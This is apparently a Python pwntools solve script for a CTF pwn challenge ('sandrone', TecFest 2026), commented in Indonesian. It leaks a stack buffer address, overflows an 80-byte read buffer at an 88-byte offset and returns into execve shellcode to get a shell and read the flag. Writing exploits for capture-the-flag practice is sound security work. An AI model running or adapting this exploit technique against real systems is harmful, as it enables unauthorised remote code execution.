#!/usr/bin/env python3
"""
Solve script untuk challenge pwn 'sandrone' (TecFest 2026, test instance @ localhost:40401).

Alur service `vuln()` (dikonfirmasi lewat objdump + validasi blackbox ke service):
  1. Service cetak "debug: buf @ 0x....\n"   -> KEBOCORAN alamat buffer `buf_read`
                                                  (buffer yang dipakai read() di step 3).
  2. Prompt "payload diagnostik: "            -> dibaca via fgets() lalu di-strcpy() TANPA
                                                  cek panjang ke buffer lain (bug kedua,
                                                  independen, tidak dipakai exploit ini).
  3. Prompt "kontrol overflow: "              -> read(0, buf_read, 0x100): baca RAW bytes
                                                  s.d. 256 byte ke buffer 80 byte -- INI
                                                  yang dipakai exploit (overflow).
  4. Kalau proses balik dengan selamat -> cetak "selesai.\n" lalu tutup koneksi.

Offset overflow (divalidasi dgn kirim 'A'*n bertahap ke prompt #3):
  - total 88 byte  -> proses masih selesai normal ("selesai.")
  - total 89 byte  -> proses crash (return address mulai ketimpa, koneksi putus)
  => offset buffer -> return address = 88 byte (cocok dgn disassembly: jarak
     buf_read ke saved-rbp 0x50 + 8 byte saved-rbp = 0x58 = 88).

Mitigasi binary (checksec manual via readelf/nm, tidak ada checksec terpasang):
  - NX OFF (stack RWE, executable)
  - No PIE (EXEC, alamat statis)
  - No canary (overflow mentah tidak ke-detect)
  - Partial RELRO

Strategi: ret2shellcode.
  payload = shellcode_execve_sh + padding sampai 88 byte + p64(leaked_buf_addr)
  Return address ditimpa dengan alamat buffer itu sendiri (yang baru dibocorkan),
  jadi RIP balik ke awal buffer dan jalanin shellcode kita.
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"

HOST = "localhost"
PORT = 40401

OFFSET_TO_RET = 88  # byte, hasil probing blackbox (lihat docstring di atas)


def exploit():
    io = remote(HOST, PORT)

    # 1) Tangkap kebocoran alamat buffer: "debug: buf @ 0x...."
    io.recvuntil(b"buf @ ")
    leak_line = io.recvline()
    buf_addr = int(leak_line.strip(), 16)
    log.success(f"Leaked buf address: {hex(buf_addr)}")

    # 2) Lewati prompt tahap 1 ("payload diagnostik: ") dengan input apa saja.
    io.recvuntil(b"payload diagnostik: ")
    io.sendline(b"test")

    # 3) Susun payload overflow untuk prompt tahap 2 ("kontrol overflow: ").
    io.recvuntil(b"kontrol overflow: ")

    shellcode = asm(shellcraft.sh())
    assert len(shellcode) <= OFFSET_TO_RET, "shellcode kepanjangan, > offset ke return address"

    payload = shellcode.ljust(OFFSET_TO_RET, b"A")  # isi sisa sampai return address
    payload += p64(buf_addr)                        # overwrite return address -> balik ke buf (shellcode)

    io.send(payload)

    # 4) Shell didapat -> ambil flag
    io.sendline(b"cat flag.txt")
    io.interactive()


if __name__ == "__main__":
    exploit()
